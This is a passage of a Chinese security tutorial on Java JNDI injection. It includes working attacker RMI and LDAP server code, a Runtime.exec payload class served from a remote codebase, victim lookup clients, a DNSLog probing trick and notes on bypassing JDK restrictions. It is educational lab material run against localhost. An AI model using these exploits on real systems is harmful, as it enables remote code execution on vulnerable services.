<p>这里先分析Reference对象的处理流程。</p>
<p>当客户端在lookup()查找这个远程对象时，客户端会获取相应的object factory，最终通过factory类将reference转换为具体的对象实例。</p>
<p>如果LDAP Server返回的属性里包括了 <code>objectClass</code> 和 <code>javaNamingReference</code> ，将进入Reference的处理函数decodeReference上。</p>
<p><img src="https://img2023.cnblogs.com/blog/532548/202310/532548-20231018141748284-1715886005.png" alt="img"></p>
<p><img src="https://img2023.cnblogs.com/blog/532548/202310/532548-20231018141830553-1574210650.png" alt="img"></p>
<p>decodeReference再从属性中提取出 <code>javaClassName</code> 和 <code>javaFactory</code> ，最后将生成一个Reference。这里生成的ref就是在RMI返回的那个ReferenceWrapper，后面这个ref将会传递给Naming Manager去处理，包括从codebase中获取class文件并载入。 </p>
<p>这里继续分析Serialized Object序列化对象的处理流程。 </p>
<p>在com&#x2F;sun&#x2F;jndi&#x2F;ldap&#x2F;Obj.java#decodeObject上还存在一个判断，</p>
<p><img src="https://img2023.cnblogs.com/blog/532548/202310/532548-20231018142504088-508309489.png" alt="img"></p>
<p>如果在返回的属性中存在 javaSerializedData ，将继续调用 deserializeObject 函数，该函数主要就是调用常规的反序列化方式readObject对序列化数据进行还原，如下payload。 </p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@Override</span> <span class="keyword">protected</span> <span class="keyword">void</span> <span class="title function_">processAttribute</span><span class="params">(Entry entry)</span>&#123; entry.addAttribute(<span class="string">&quot;javaClassName&quot;</span>, <span class="string">&quot;foo&quot;</span>); entry.addAttribute(<span class="string">&quot;javaSerializedData&quot;</span>, serialized); &#125;</span><br></pre></td></tr></table></figure>

<p><img src="https://img2023.cnblogs.com/blog/532548/202310/532548-20231018142643257-1125020660.png" alt="img"></p>
<p>接下来分析服务端攻击代码所使用的Reference类，Reference 是一个抽象类，每个 Reference 都有一个指向的对象，对象指定类会被加载并实例化。</p>
<p>在上面服务端代码中，reference 指定了一个 Calculator 类，于远程的 <a target="_blank" rel="noopener" href="http://127.0.0.1:8081/">http://127.0.0.1:8081/</a> 服务端上，等待客户端的调用并实例化执行。</p>
<p><img src="https://img2023.cnblogs.com/blog/532548/202310/532548-20231018140210694-535703835.png" alt="img"></p>
<p>以上就是JNDI注入的基本原理（核心就是远程对象解析引发的对象重建过程带来的风险调用链问题），但是JNDI注入并没有这么简单，因为java在漫长的迭代生涯中一直在添加新的补丁特性，使得JNDI的利用越来越困难（主要是禁用了从远程加载Java对象），而同时安全研究员也在不断研究出新的绕过利用方式（主要是寻找本地gadgets）。 </p>
<h2 id="三、JNDI注入漏洞复现"><a href="#三、JNDI注入漏洞复现" class="headerlink" title="三、JNDI注入漏洞复现"></a>三、JNDI注入漏洞复现</h2><p>这一章采用最基础的远程reference对象注入，本章中的代码将作为后续章节的基础。</p>
<h3 id="JNDI-RMI-复现"><a href="#JNDI-RMI-复现" class="headerlink" title="JNDI+RMI 复现"></a>JNDI+RMI 复现</h3><p>漏洞利用过程归纳总结为：</p>
<p>由于 lookup() 的参数可控，攻击者在远程服务器上构造恶意的 Reference 类绑定在 RMIServer 的 Registry 里面，然后客户端调用 lookup() 函数里面的对象，远程类获取到 Reference 对象，客户端接收 Reference 对象后，寻找 Reference 中指定的类，若查找不到，则会在 Reference 中指定的远程地址去进行请求，请求到远程的类后会在本地进行执行，从而达到 JNDI 注入攻击。</p>
<h4 id="1、项目代码编写"><a href="#1、项目代码编写" class="headerlink" title="1、项目代码编写"></a>1、项目代码编写</h4><p>新建maven项目，</p>
<p><img src="https://img2023.cnblogs.com/blog/532548/202310/532548-20231017093429131-433910728.png" alt="img"></p>
<p>在 &#x2F;src&#x2F;java 目录下创建一个包，包名为 jndi_rmi_injection，</p>
<p><img src="https://img2023.cnblogs.com/blog/532548/202310/532548-20231017093546004-1166534886.png" alt="img"></p>
<p>在创建的jndi_rmi_injection包下新建 rmi 服务端和客户端，</p>
<p>服务端（RMIService.java）代码，服务端是攻击者控制的服务器</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> jndi_rmi_injection;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.rmi.registry.LocateRegistry;</span><br><span class="line"><span class="keyword">import</span> java.rmi.registry.Registry;</span><br><span class="line"><span class="keyword">import</span> javax.naming.Reference;</span><br><span class="line"><span class="keyword">import</span> com.sun.jndi.rmi.registry.ReferenceWrapper;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">RMIService</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception&#123;</span><br><span class="line">        <span class="type">Registry</span> <span class="variable">registry</span> <span class="operator">=</span> LocateRegistry.createRegistry(<span class="number">7778</span>);</span><br><span class="line">        <span class="type">Reference</span> <span class="variable">reference</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Reference</span>(<span class="string">&quot;Calculator&quot;</span>,<span class="string">&quot;Calculator&quot;</span>,<span class="string">&quot;http://127.0.0.1:8081/&quot;</span>);</span><br><span class="line">        <span class="type">ReferenceWrapper</span> <span class="variable">wrapper</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ReferenceWrapper</span>(reference);</span><br><span class="line">        registry.bind(<span class="string">&quot;RCE&quot;</span>,wrapper);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>服务端端恶意载荷（Calculator.java）代码</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> jndi_rmi_injection;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Calculator</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="title function_">Calculator</span><span class="params">()</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        Runtime.getRuntime().exec(<span class="string">&quot;open -a Calculator&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>笔者使用的是 mac 的环境，执行弹出计算器的命令为”open -a Calculator“，若为Windwos 修改为”calc“即可。</p>
<p>客户端（RMIClient.java）代码，客户端代表存在漏洞的受害端。</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> jndi_rmi_injection;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> javax.naming.InitialContext;</span><br><span class="line"><span class="keyword">import</span> javax.naming.NamingException;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">RMIClient</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> NamingException&#123;</span><br><span class="line">        <span class="type">String</span> <span class="variable">uri</span> <span class="operator">=</span> <span class="string">&quot;rmi://127.0.0.1:7778/RCE&quot;</span>;    <span class="comment">// 实际场景中这个url是外部攻击者可控的，这里为了简化直接硬编码</span></span><br><span class="line">        <span class="type">InitialContext</span> <span class="variable">initialContext</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">InitialContext</span>();</span><br><span class="line">        initialContext.lookup(uri);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h4 id="2、启动RMI服务"><a href="#2、启动RMI服务" class="headerlink" title="2、启动RMI服务"></a>2、启动RMI服务</h4><p>将 HTTP 端恶意载荷 Calculator.java，编译成 Calculator.class 文件，</p>
<p><img src="https://img2023.cnblogs.com/blog/532548/202310/532548-20231017095154797-519681735.png" alt="img"></p>
<p><img src="https://img2023.cnblogs.com/blog/532548/202310/532548-20231017095408986-894768409.png" alt="img"></p>
<p>在 Calculator.class 目录下利用 Python 起一个临时的 WEB 服务放置恶意载荷，这里的端口必须要与 RMIServer.java 的 Reference 里面的链接端口一致。</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python3 -m http.server 8081</span><br></pre></td></tr></table></figure>

<p><img src="https://img2023.cnblogs.com/blog/532548/202310/532548-20231017141942311-965063169.png" alt="img"></p>
<p><img src="https://img2023.cnblogs.com/blog/532548/202310/532548-20231017142004293-2062910561.png" alt="img"></p>
<p>先运行攻击者可控的RMI服务端，用于接受来自己客户端的lookup请求，</p>
<p><img src="https://img2023.cnblogs.com/blog/532548/202310/532548-20231017142428625-1962266576.png" alt="img"></p>
<h4 id="3、启动包含lookup功能的客户端服务，即启动存在被漏洞利用风险的服务"><a href="#3、启动包含lookup功能的客户端服务，即启动存在被漏洞利用风险的服务" class="headerlink" title="3、启动包含lookup功能的客户端服务，即启动存在被漏洞利用风险的服务"></a>3、启动包含lookup功能的客户端服务，即启动存在被漏洞利用风险的服务</h4><p>运行客户端，模拟被攻击者JNDI注入过程，远程获取恶意类，并执行恶意类代码，实现弹窗。</p>
<h3 id="JNDI-LDAP-复现"><a href="#JNDI-LDAP-复现" class="headerlink" title="JNDI+LDAP 复现"></a>JNDI+LDAP 复现</h3><p>攻击者搭建LDAP服务器，需要导入unboundid依赖库。</p>
<p>在本项目根目录下创建&#x2F;lib目录，用于放置本地依赖库，点击下载 <a target="_blank" rel="noopener" href="https://repo.maven.apache.org/maven2/com/unboundid/unboundid-ldapsdk/3.2.0/unboundid-ldapsdk-3.2.0.jar">unboundid-ldapsdk-3.2.0.jar</a>，导入依赖即可，</p>
<p><img src="https://img2023.cnblogs.com/blog/532548/202310/532548-20231018102206047-1360155771.png" alt="img"></p>
<p>LDAPServer.java 服务端代码，服务端是攻击者控制的服务器。</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> jndi_rmi_injection;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.net.InetAddress;</span><br><span class="line"><span class="keyword">import</span> java.net.MalformedURLException;</span><br><span class="line"><span class="keyword">import</span> java.net.URL;</span><br><span class="line"><span class="keyword">import</span> javax.net.ServerSocketFactory;</span><br><span class="line"><span class="keyword">import</span> javax.net.SocketFactory;</span><br><span class="line"><span class="keyword">import</span> javax.net.ssl.SSLSocketFactory;</span><br><span class="line"><span class="keyword">import</span> com.unboundid.ldap.listener.InMemoryDirectoryServer;</span><br><span class="line"><span class="keyword">import</span> com.unboundid.ldap.listener.InMemoryDirectoryServerConfig;</span><br><span class="line"><span class="keyword">import</span> com.unboundid.ldap.listener.InMemoryListenerConfig;</span><br><span class="line"><span class="keyword">import</span> com.unboundid.ldap.listener.interceptor.InMemoryInterceptedSearchResult;</span><br><span class="line"><span class="keyword">import</span> com.unboundid.ldap.listener.interceptor.InMemoryOperationInterceptor;</span><br><span class="line"><span class="keyword">import</span> com.unboundid.ldap.sdk.Entry;</span><br><span class="line"><span class="keyword">import</span> com.unboundid.ldap.sdk.LDAPException;</span><br><span class="line"><span class="keyword">import</span> com.unboundid.ldap.sdk.LDAPResult;</span><br><span class="line"><span class="keyword">import</span> com.unboundid.ldap.sdk.ResultCode;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">LDAPServer</span> &#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">final</span> <span class="type">String</span> <span class="variable">LDAP_BASE</span> <span class="operator">=</span> <span class="string">&quot;dc=example,dc=com&quot;</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span> <span class="params">(String[] args)</span> &#123;</span><br><span class="line">        <span class="type">String</span> <span class="variable">url</span> <span class="operator">=</span> <span class="string">&quot;http://127.0.0.1:8081/#Calculator&quot;</span>;</span><br><span class="line">        <span class="type">int</span> <span class="variable">port</span> <span class="operator">=</span> <span class="number">1234</span>;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            <span class="type">InMemoryDirectoryServerConfig</span> <span class="variable">config</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">InMemoryDirectoryServerConfig</span>(LDAP_BASE);</span><br><span class="line">            config.setListenerConfigs(<span class="keyword">new</span> <span class="title class_">InMemoryListenerConfig</span>(</span><br><span class="line">                    <span class="string">&quot;listen&quot;</span>,</span><br><span class="line">                    InetAddress.getByName(<span class="string">&quot;0.0.0.0&quot;</span>),</span><br><span class="line">                    port,</span><br><span class="line">                    ServerSocketFactory.getDefault(),</span><br><span class="line">                    SocketFactory.getDefault(),</span><br><span class="line">                    (SSLSocketFactory) SSLSocketFactory.getDefault()));</span><br><span class="line"></span><br><span class="line">            config.addInMemoryOperationInterceptor(<span class="keyword">new</span> <span class="title class_">OperationInterceptor</span>(<span class="keyword">new</span> <span class="title class_">URL</span>(url)));</span><br><span class="line">            <span class="type">InMemoryDirectoryServer</span> <span class="variable">ds</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">InMemoryDirectoryServer</span>(config);</span><br><span class="line">            System.out.println(<span class="string">&quot;Listening on 0.0.0.0:&quot;</span> + port);</span><br><span class="line">            ds.startListening();</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">catch</span> ( Exception e ) &#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">class</span> <span class="title class_">OperationInterceptor</span> <span class="keyword">extends</span> <span class="title class_">InMemoryOperationInterceptor</span> &#123;</span><br><span class="line">        <span class="keyword">private</span> URL codebase;</span><br><span class="line">        <span class="comment">/**</span></span><br><span class="line"><span class="comment">         *</span></span><br><span class="line"><span class="comment">         */</span></span><br><span class="line">        <span class="keyword">public</span> <span class="title function_">OperationInterceptor</span> <span class="params">( URL cb )</span> &#123;</span><br><span class="line">            <span class="built_in">this</span>.codebase = cb;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="comment">/**</span></span><br><span class="line"><span class="comment">         * &#123;<span class="doctag">@inheritDoc</span>&#125;</span></span><br><span class="line"><span class="comment">         *</span></span><br><span class="line"><span class="comment">         * <span class="doctag">@see</span> com.unboundid.ldap.listener.interceptor.InMemoryOperationInterceptor#processSearchResult(com.unboundid.ldap.listener.interceptor.InMemoryInterceptedSearchResult)</span></span><br><span class="line"><span class="comment">         */</span></span><br><span class="line">        <span class="meta">@Override</span></span><br><span class="line">        <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">processSearchResult</span> <span class="params">( InMemoryInterceptedSearchResult result )</span> &#123;</span><br><span class="line">            <span class="type">String</span> <span class="variable">base</span> <span class="operator">=</span> result.getRequest().getBaseDN();</span><br><span class="line">            <span class="type">Entry</span> <span class="variable">e</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Entry</span>(base);</span><br><span class="line">            <span class="keyword">try</span> &#123;</span><br><span class="line">                sendResult(result, base, e);</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">catch</span> ( Exception e1 ) &#123;</span><br><span class="line">                e1.printStackTrace();</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">protected</span> <span class="keyword">void</span> <span class="title function_">sendResult</span> <span class="params">( InMemoryInterceptedSearchResult result, String base, Entry e )</span> <span class="keyword">throws</span> LDAPException, MalformedURLException &#123;</span><br><span class="line">            <span class="type">URL</span> <span class="variable">turl</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">URL</span>(<span class="built_in">this</span>.codebase, <span class="built_in">this</span>.codebase.getRef().replace(<span class="string">&#x27;.&#x27;</span>, <span class="string">&#x27;/&#x27;</span>).concat(<span class="string">&quot;.class&quot;</span>));</span><br><span class="line">            System.out.println(<span class="string">&quot;Send LDAP reference result for &quot;</span> + base + <span class="string">&quot; redirecting to &quot;</span> + turl);</span><br><span class="line">            e.addAttribute(<span class="string">&quot;javaClassName&quot;</span>, <span class="string">&quot;Exploit&quot;</span>);</span><br><span class="line">            <span class="type">String</span> <span class="variable">cbstring</span> <span class="operator">=</span> <span class="built_in">this</span>.codebase.toString();</span><br><span class="line">            <span class="type">int</span> <span class="variable">refPos</span> <span class="operator">=</span> cbstring.indexOf(<span class="string">&#x27;#&#x27;</span>);</span><br><span class="line">            <span class="keyword">if</span> ( refPos &gt; <span class="number">0</span> ) &#123;</span><br><span class="line">                cbstring = cbstring.substring(<span class="number">0</span>, refPos);</span><br><span class="line">            &#125;</span><br><span class="line">            e.addAttribute(<span class="string">&quot;javaCodeBase&quot;</span>, cbstring);</span><br><span class="line">            e.addAttribute(<span class="string">&quot;objectClass&quot;</span>, <span class="string">&quot;javaNamingReference&quot;</span>);</span><br><span class="line">            e.addAttribute(<span class="string">&quot;javaFactory&quot;</span>, <span class="built_in">this</span>.codebase.getRef());</span><br><span class="line">            result.sendSearchEntry(e);</span><br><span class="line">            result.setResult(<span class="keyword">new</span> <span class="title class_">LDAPResult</span>(<span class="number">0</span>, ResultCode.SUCCESS));</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>客户端（LDAPClient.java）代码，客户端代表存在漏洞的受害端。</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> jndi_rmi_injection;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> javax.naming.InitialContext;</span><br><span class="line"><span class="keyword">import</span> javax.naming.NamingException;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">LDAPClient</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> NamingException&#123;</span><br><span class="line">        <span class="type">String</span> <span class="variable">url</span> <span class="operator">=</span> <span class="string">&quot;ldap://127.0.0.1:1234/Calculator&quot;</span>;</span><br><span class="line">        <span class="type">InitialContext</span> <span class="variable">initialContext</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">InitialContext</span>();</span><br><span class="line">        initialContext.lookup(url);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>HTTP 端恶意载荷（Calculator.java）代码和上一小节保持不变。</p>
<p>将 HTTP 端恶意载荷 Calculator.java，编译成 Calculator.class 文件，在 Calculator.class 目录下利用 Python 起一个临时的 WEB 服务放置恶意载荷,这里的端口必须要与 LDAPServer.java 的 Reference 里面的链接端口一致。</p>
<p>先启动服务端，</p>
<p><img src="https://img2023.cnblogs.com/blog/532548/202310/532548-20231018103141863-1955817855.png" alt="img"></p>
<p>再启动客户端。</p>
<p><img src="https://img2023.cnblogs.com/blog/532548/202310/532548-20231018103244480-1542213748.png" alt="img"></p>
<h3 id="JNDI-DNS-复现"><a href="#JNDI-DNS-复现" class="headerlink" title="JNDI+DNS 复现"></a>JNDI+DNS 复现</h3><p>通过上面我们可知 JNDI 注入可以利用 RMI 协议和LDAP 协议搭建服务然后执行命令，但有个不好的点就是会暴露自己的服务器 IP 。在没有确定存在漏洞前，直接在直接服务器上使用 RMI 或者 LDAP 去执行命令，通过日志可分析得到攻击者的服务器 IP，这样在没有获取成果的前提下还暴露了自己的服务器 IP，得不偿失。</p>
<p>为了解决这个问题，可以使用DNS 协议进行探测，通过 DNS 协议去探测是否真的存在漏洞，再去利用 RMI 或者 LDAP 去执行命令，避免过早暴露服务器 IP，这也是平常大多数人习惯使用 DNSLog 探测的原因之一，同样的 ldap 和 rmi 也可以使用 DNSLog 平台去探测。</p>
<p>漏洞端代码</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> jndi_ldap_injection;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> javax.naming.InitialContext;</span><br><span class="line"><span class="keyword">import</span> javax.naming.NamingException;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">LDAPClient</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> NamingException&#123;</span><br><span class="line">        <span class="type">String</span> <span class="variable">url</span> <span class="operator">=</span> <span class="string">&quot;dns://192rzl.dnslog.cn&quot;</span>;</span><br><span class="line">        <span class="type">InitialContext</span> <span class="variable">initialContext</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">InitialContext</span>();</span><br><span class="line">        initialContext.lookup(url);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>填入 DNSLog 平台域名，或自己搭建的平台域名，执行程序。</p>
<p>参考链接：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">https://www.veracode.com/blog/research/exploiting-jndi-injections-java</span><br><span class="line">https://xz.aliyun.com/t/12277#toc-5</span><br><span class="line">https://evilpan.com/2021/12/13/jndi-injection/#remote-class </span><br></pre></td></tr></table></figure>

<h2 id="四、不同JDK版本中JNDI注入存在的限制及绕过方法"><a href="#四、不同JDK版本中JNDI注入存在的限制及绕过方法" class="headerlink" title="四、不同JDK版本中JNDI注入存在的限制及绕过方法"></a>四、不同JDK版本中JNDI注入存在的限制及绕过方法</h2><p>Java JNDI注入有很多种不同的利用载荷，而这些Payload分别会面临一些限制。 </p>
<p>我们来整理一下，关于jndi的相关安全更新：</p>
<ul>
<li>JDK 6u132, JDK 7u122, JDK 8u113中添加了com.sun.jndi.rmi.object.trustURLCodebase、com.sun.jndi.cosnaming.object.trustURLCodebase 的默认值变为false。导致jndi的rmi reference方式失效，但ldap的reference方式仍然可行</li>
<li>Oracle JDK 11.0.1、8u191、7u201、6u211之后 com.sun.jndi.ldap.object.trustURLCodebase 属性的默认值被调整为false。导致jndi的ldap reference方式失效，到这里为止，远程codebase的方式基本失效，除非认为设为true</li>
</ul>
<p>在最新版的jdk8u上，jndi ldap的本地反序列化利用链 1 和 2 的方式仍然未失效，jndi rmi底层(JRMPListener) StreamRemoteCall 的本地利用方式仍未失效。所以如果Reference的方式不行的时候，可以试试利用本地ClassPath里的反序列化利用链来达成RCE。但前提是需要利用一个本地的反序列化利用链（如CommonsCollections、EL表达式等）。</p>
<p><img src="https://img2023.cnblogs.com/blog/532548/202310/532548-20231018171046770-1076963293.jpg" alt="img"></p>
<p>我们接下来按照java版本的演进分别分析JNDI注入的方法。</p>
<p>在实验前，要准备好不同版本的<a target="_blank" rel="noopener" href="https://repo.huaweicloud.com/java/jdk/8u181-b13/">jdk</a>方便测试。</p>
<p><img src="https://img2023.cnblogs.com/blog/532548/202310/532548-20231018194152207-405258838.png" alt="img"></p>
<h3 id="6u45-x2F-7u21之前-x2F-JDK版本低于1-8-0-191"><a href="#6u45-x2F-7u21之前-x2F-JDK版本低于1-8-0-191" class="headerlink" title="6u45&#x2F;7u21之前&#x2F;JDK版本低于1.8.0_191"></a>6u45&#x2F;7u21之前&#x2F;JDK版本低于1.8.0_191</h3><p><img src="https://img2023.cnblogs.com/blog/532548/202310/532548-20231018194359853-1439275215.png" alt="img"></p>
<p><img src="https://img2023.cnblogs.com/blog/532548/202310/532548-20231018194445389-577658035.png" alt="img"></p>
<p><img src="https://img2023.cnblogs.com/blog/532548/202310/532548-20231018195352884-1128302728.png" alt="img"></p>
<p>在这个版本之前，JNDI注入的利用条件是最宽松的，如果攻击者可以控制lookup()的返回内容，就可以很容易地把返回内容设置成一个远程Java对象下载地址，以此触发远程对象加载。</p>
<p>我们创建一个恶意的RMI服务器，并响应一个恶意的远程Java对象下载地址。编译后的RMI远程对象类可以放在HTTP&#x2F;FTP&#x2F;SMB等服务器上</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> jndi_rmi_injection;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.rmi.registry.LocateRegistry;</span><br><span class="line"><span class="keyword">import</span> java.rmi.registry.Registry;</span><br><span class="line"><span class="keyword">import</span> javax.naming.Reference;</span><br><span class="line"><span class="keyword">import</span> com.sun.jndi.rmi.registry.ReferenceWrapper;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">RMIService</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception&#123;</span><br><span class="line">        <span class="type">Registry</span> <span class="variable">registry</span> <span class="operator">=</span> LocateRegistry.createRegistry(<span class="number">7778</span>);</span><br><span class="line">        <span class="type">Reference</span> <span class="variable">reference</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Reference</span>(<span class="string">&quot;Calculator&quot;</span>,<span class="string">&quot;Calculator&quot;</span>,<span class="string">&quot;http://127.0.0.1:8081/&quot;</span>);</span><br><span class="line">        <span class="type">ReferenceWrapper</span> <span class="variable">wrapper</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ReferenceWrapper</span>(reference);</span><br><span class="line">        registry.bind(<span class="string">&quot;RCE&quot;</span>,wrapper);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

